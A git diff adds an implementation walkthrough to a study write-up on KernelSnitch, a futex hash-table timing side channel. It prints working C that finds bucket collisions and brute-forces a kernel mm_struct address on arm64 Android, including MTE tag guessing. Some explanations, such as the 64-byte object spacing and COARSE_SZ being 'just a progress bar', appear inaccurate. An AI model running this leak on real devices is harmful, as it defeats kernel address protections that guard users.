@@ -372,7 +372,282 @@ We just leaked a kernel pointer using nothing but timing and arithmetic.
 
 
 
+### Practical Implementation
 
+**Step 1 — Fill a bucket && Probe with timing**
+
+In our `src/main.c` first we call `kernelsnitch_setup` there's nothing interesting for us it just adjust some parameter that we will use throughout entire execution, like mm_struct size, order and collision count so, I just copied and pasted it from other public repo's. There's nothing fancy I changed.
+
+Some of the  **ks (struct kernelsnitch_shared_state**) definitions:
+
+- **`ks->mm_struct`** -> This will be address of our kernel side mm_struct object. For the setup phase we set it `-1` because we dont know it yet.
+
+- **`ks->mm_struct_sz `**-> the measured/known size of `struct mm_struct` (the `objsize` column you saw in `/proc/slabinfo`, e.g. 1536). Needed later for any `mm_struct`-cache spraying/leaking step — not used directly by the futex-hashing logic, but stored for a separate phase of the attack that targets the `mm_struct` slab cache itself.  If you are using different kernel version than mine adjust it to your own kernel via checking:
+  ![image-20261031090143876](./github_imgs/mm_struct_slabsize.png)
+
+That is why:
+
+`src/main.c`
+
+``````c
+#define MM_STRUCT_SZ 1152 // You need to adjust this
+#define MM_ORDER 3 // You need to adjust this
+``````
+
+- **`ks->futex_hash_table_size`**, **`ks->total_futexes`**, **`ks->times`** -> In simple words these fields will be used in collision find logic, and making it large enough important for correctness. 
+
+Then we call`kernelsnitch_find_collisions`. Inside that function: 
+
+``````c
+void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
+{
+    #define ID 128
+#ifndef KERNELSNITCH_THRESHOLD_MULT
+#define KERNELSNITCH_THRESHOLD_MULT 10
+#endif
+    size_t count = 0;
+    size_t wanted;
+    size_t futex_addr;
+    size_t id;
+    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
+    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
+    wanted = 8;
+
+[1] size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    printf("Approx_time: [%d]\n", approx_time);
+    
+    // piled-up hash bucket ID 128
+    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
+
+[2] __increase(ks, ID, APPENDED_FUTEXES);
+    
+    pr_info("start finding collisisons\n");
+    
+    // find futex user space address which collide with the piled-up hash bucket ID 128
+[3] ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
+    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+        if (id >= FUTEX_SZ)
+            break;
+        futex_addr = (size_t)&ks->futexes[id];
+        
+[4]     ks->times[i] = __measure(futex_addr);
+        
+        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+            
+            count++;
+            ks->futex_addrs[count] = futex_addr;
+            pr_info("[%d] Collision address: 0x%lx\n", count, futex_addr);            
+        }
+    }
+    if (wanted == count) {
+        if (ks->verbose) pr_info("found %zd collisisons\n", count);
+        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+    } else {
+        pr_warning("only found %zd collisions -> cannot continue\n", count);
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+    }
+}
+``````
+
+[1] We need to determine **approximete** time that **futex_wake** syscall take for emtpy hash bucket, because we didn't fill that bucket by calling __increase for now.
+
+[2] We call `_increase` function which fills hash_bucket with same uaddr value `&ks->inc_futex[128]`.
+
+[3] We memorize that address of `&ks->inc_futex[128]`, we will need this for comparison later.
+
+[4] Measure how long **futex_wake** syscall take via random **uaddr** values. If It takes **10x** more than empty bucket then likely this will land into our **hash_bucket** which we filled with `&ks->inc_futex[128]` uaddr value.
+
+Then it memorizes all uaddr values that takes **10x** more than empty hash_bucket which is `time(uaddr) > approx_time*10`
+
+
+
+**Step 2 - Brute Force random mm_struct addresses.**
+
+Now program memorized all uaddr values that takes more than approx time(emtpy hash_bucket) in `ks->futex_addrs[]` array. 
+
+So at this point we have everything we need on the **futex key** side (the `uaddr`s that collide into our piled-up bucket), the only unknown left in `union futex_key` is `key->private.mm` — the actual **mm_struct** pointer of the victim. `kernelsnitch_bruteforce` is the function that goes hunting for it.
+
+``````c
+void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
+{
+    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
+    if (ks->verbose) pr_info("start bruteforcing\n");
+    reset_cpu_pin();
+
+    for (size_t i = 0; i < ks->thread_cnt; ++i) {
+        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+        mm_leak_arg->ks = ks;
+[1]     mm_leak_arg->range.id = i;
+[2]     mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
+[2]     mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+[3]     if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+[3]     if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
+            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+[4]     SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+    }
+[5] for (size_t i = 0; i < ks->thread_cnt; ++i)
+        pthread_join(ks->tids[i], 0);
+[6] ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+}
+``````
+
+Why do we even get to brute force across a whole address range instead of just trying random 64-bit numbers? Because **mm_struct** is a slab object, and every slab object is backed by a physical page, and every physical page in the system is mirrored 1:1 inside one fixed kernel region called the **linear map** (`phys_to_virt(x) = (x - PHYS_OFFSET) | PAGE_OFFSET`). So instead of a 2^39-sized haystack, our real haystack shrinks down to "however big the linear map region is" — that's exactly what `IDENTITY_START`/`IDENTITY_END` mark the boundaries of.
+
+[1] `mm_leak_arg->range.id = i` -> just a thread index, nothing fancy, used for bookkeeping/logging.
+
+[2] `range.start`/`range.end` -> This is the actual work-splitting logic. We take the entire linear map (`IDENTITY_START` .. `IDENTITY_END`), and cut it into `thread_cnt` equal-sized slices via `ks->identity_diff` (`= (IDENTITY_END - IDENTITY_START) / thread_cnt`). Thread `i` only scans its own slice `[IDENTITY_START + identity_diff*i, IDENTITY_START + identity_diff*(i+1))` — this is how the brute force is parallelized across CPU cores instead of one thread crawling the whole range serially.
+
+[3] The two `COARSE_SZ` roundings -> `mm_struct` can't start at just any byte offset, it only ever lands on slab/allocation-aligned boundaries. `COARSE_SZ` is that alignment granularity. These two `if` blocks just snap each thread's `start` **down** and `end` **up** to the nearest `COARSE_SZ` boundary, so that:
+
+- no thread accidentally starts mid-object (would cause missed candidates)
+- neighboring threads' ranges slightly overlap at the seams instead of leaving a gap between them
+
+[4] `pthread_create(..., __mm_leak, mm_leak_arg)` -> spawns one worker thread per slice. `__mm_leak` is where the actual per-candidate testing happens: for every `COARSE_SZ`-aligned address `g` inside its assigned slice, the thread builds a local `union futex_key` using `g` as the guessed `mm`, runs it through the same `jhash2`-based `futex_hash()` math the kernel uses, and checks whether the predicted bucket lines up with the collision we already measured and stored in `ks->futex_addrs[]` back in Step 1. A match gets confirmed/refined against our memorized colliding `uaddr`s, and on success the thread writes the winning guess into `ks->mm_struct`.
+
+[5] `pthread_join(...)` -> main thread just waits here until every worker has either exhausted its slice or already found the answer.
+
+[6] Final state check -> remember `ks->mm_struct` was initialized to `-1` back in `kernelsnitch_setup`. If it's still `-1` after every thread finishes, none of them found a match (`KERNELSNITCH_MM_NOT_FOUND`); otherwise some thread overwrote it with the real **mm_struct** address (`KERNELSNITCH_MM_FOUND`), and we're done — that's the leaked kernel pointer.
+
+In simple explanation, if we have 8GB of RAM in our device then we only need to brute-force roughly that 8GB slice of the linear map, not the whole 64GB reservation — since we’re testing on `android14-6.1-2024-04` and that kernel is compiled as **arm64 VA39**, you can confirm this yourself via:
+
+```bash
+zcat /proc/config.gz | grep CONFIG_ARM64_VA_BITS
+# or, if config.gz isn't exposed:
+dmesg | grep -i "Virtual kernel memory"
+```
+
+so we define:
+
+```cpp
+#if VA_BITS==39
+#ifndef KERNELSNITCH_IDENTITY_START
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+```
+
+`KERNELSNITCH_IDENTITY_START` is the fixed starting virtual address of the kernel’s linear map on 39-bit VA (`PAGE_OFFSET`, computed from `-(1 << VA_BITS)`). The bruteforce walks forward from this address, trying every candidate aligned to `mm_struct`’s slab object size and order (not byte-by-byte, since `mm_struct` can only ever start on a slab-aligned boundary), hashes each guess the same way the kernel’s `futex_hash()` would, and compares that result against `&ks->inc_futex[128]` and the other collision addresses we already memorized in Step 1. The moment a guessed address produces the same hash as our measured collisions, that guess **is** the real `mm_struct` address.
+
+
+
+**Inside `__mm_leak` — what every worker thread actually does**
+
+`kernelsnitch_bruteforce` only hands each thread a `[range.start, range.end)` slice and spawns it — all the real candidate-generation and hash-matching logic lives in `__mm_leak`, which runs once per thread on its own slice:
+
+```c
+static void *__mm_leak(void *arg)
+{
+    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
+    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
+    struct range *range = &mm_leak_arg->range;
+    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
+[1] size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+[2] for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+        if ((coarse_addr % (1ULL << 40)) == 0)
+            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
+[3]     for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
+[4]         for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += 64) {
+                size_t found_hash = 1;
+[5]             if (!ks->mte_enabled) {
+                    // test the mm_struct candidate
+[6]                 unsigned int index_0 = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
+                    for (size_t i = 1; i < ks->collisions && found_hash; ++i){
+                        unsigned int index_i = futex_hash(ks->futex_addrs[i], mm_struct_candidate);
+                        found_hash = (index_0 == index_i);
+                    }
+                    if (found_hash) {
+                        ks->mm_struct = mm_struct_candidate;
+                        pr_info("[SUCCESS]: Leaked mm_struct: 0x%zx\n", ks->mm_struct);
+                        ks->found = 1;
+                        break;
+                    }
+                } else {
+                    // need to set the tag if mte is enabled
+[7]                 for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
+                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
+                        __mm_struct_candidate |= (tag_candidate << 56);
+                        found_hash = 1;
+                        for (size_t i = 1; i < ks->collisions && found_hash; ++i){
+                            unsigned int index_0 = futex_hash(ks->futex_addrs[0], __mm_struct_candidate);
+                            unsigned int index_i = futex_hash(ks->futex_addrs[i], __mm_struct_candidate);
+                            found_hash = (index_0 == index_i);
+                        }
+                        if (found_hash) {
+                            ks->mm_struct = __mm_struct_candidate;
+                            ks->found = 1;
+                            break;
+                        }
+                    }
+                } 
+            }
+        }
+    }
+    free(mm_leak_arg);
+    return 0;
+}
+```
+
+Think of it like searching for one specific book, in one specific library, among millions of libraries.
+
+```
+[ YOUR 8GB/64GB SEARCH AREA = a city full of libraries ]
+        │
+        ▼ jump by COARSE_SZ (1GB) ─ just walking down the street, block by block
+        │   (this number is ONLY here so it can print "still searching..." sometimes.
+        │    it has nothing to do with finding the book, it's just a progress bar.)
+        ▼
+   ┌─────────────┐
+   │ ONE LIBRARY │   <- this is one "slab". size = mm_slab_sz
+   └─────────────┘
+        │
+        ▼ jump by mm_slab_sz ─ walk street to street, but ONLY stop at library buildings
+        │   (we skip houses/shops in between because the book can ONLY be inside
+        │    a library, never anywhere else — so checking non-library buildings
+        │    would be a waste of time)
+        ▼
+   ┌───┬───┬───┬───┬───┬───┐
+   │ 1 │ 2 │ 3 │ 4 │ 5 │...│   <- one library has many shelves (objects) inside it
+   └───┴───┴───┴───┴───┴───┘
+        │
+        ▼ jump by 64 bytes ─ check shelf 1, shelf 2, shelf 3...
+        │   (every shelf is exactly 64 bytes apart, so we hop shelf-to-shelf
+        │    instead of checking every single page of every single book)
+        ▼
+   ┌────────┐
+   │ SHELF  │  <- one candidate guess for mm_struct
+   └────────┘
+        │
+        ▼ "is this the right book?"
+        │
+    ┌───────────────────────────────┐
+    │ hash(shelf, collision#1) == ? │──NO──▶ wrong shelf, move to next one
+    │ hash(shelf, collision#2) == ? │
+    │ hash(shelf, collision#3) == ? │
+    └───────────────────────────────┘
+        │
+       YES (all match)
+        │
+        ▼
+   🎉 FOUND mm_struct! 🎉
+```
+
+**In plain words:**
+
+- **Step A (1GB jumps):** We don't search byte-by-byte because that would take forever. We jump in big 1GB chunks just so the program can print "I'm still alive, here's my progress" every so often. This number means nothing special, it's just a logging checkpoint.
+- **Step B (slab-size jumps):** `mm_struct` only lives inside special kernel storage blocks called "slabs." So instead of checking every single address, we only stop at the start of each slab — calculated from the slab size we looked up earlier in `/proc/slabinfo`. Checking in-between addresses would be pointless, nothing real can be there.
+- **Step C (64-byte jumps):** One slab holds many `mm_struct` objects lined up back-to-back, each one 64 bytes apart (like shelves in a library). So inside one slab, we check shelf 1, shelf 2, shelf 3... one object at a time.
+- **Step D (the hash check):** For every guessed shelf (address), we ask: "if this really were the victim's `mm_struct`, would it produce the exact same hash collisions we already measured with the timing attack?" We check it against **several** collisions, not just one, so a lucky coincidental match doesn't fool us. If they *all* agree → that's our answer.
+- **Step E (the MTE twist):** Some phones scramble the top few bits of every pointer as a security feature (called MTE). If that's turned on, we don't just guess the address — we also have to guess which of 16 possible "stickers" (tags) was slapped on top of it. So it's like: "is this the right shelf... *and* is it wearing the right colored sticker?" — up to 16x more guessing work.
+
+**TL;DR table:**
+
+| Jump size       | What it skips past                  | Why                                                          |
+| --------------- | ----------------------------------- | ------------------------------------------------------------ |
+| 1GB             | nothing important                   | just a progress-print checkpoint                             |
+| slab size       | random non-slab memory              | `mm_struct` can only start at a slab boundary                |
+| 64 bytes        | nothing, this IS the object spacing | each `mm_struct` object inside a slab sits exactly 64 bytes from the next |
+| ×16 (if MTE on) | —                                   | brute-forcing the random tag sticker on top of the address   |
 
 ### Let's test our code.
 
@@ -423,7 +698,7 @@ above breakpoint will hit when we call `__increase` function.
 target remote localhost:1234
 ``````
 
-![image-20261030110439005](/home/cybercrow/Documents/Projects/kernelsnitch_study/github_imgs/image-20261030110439005.png)
+![image-20261030110439005](./github_imgs/image-20261030110439005.png)
 
 ![image-20261030110457935](./github_imgs/image-20261030110457935.png)
 
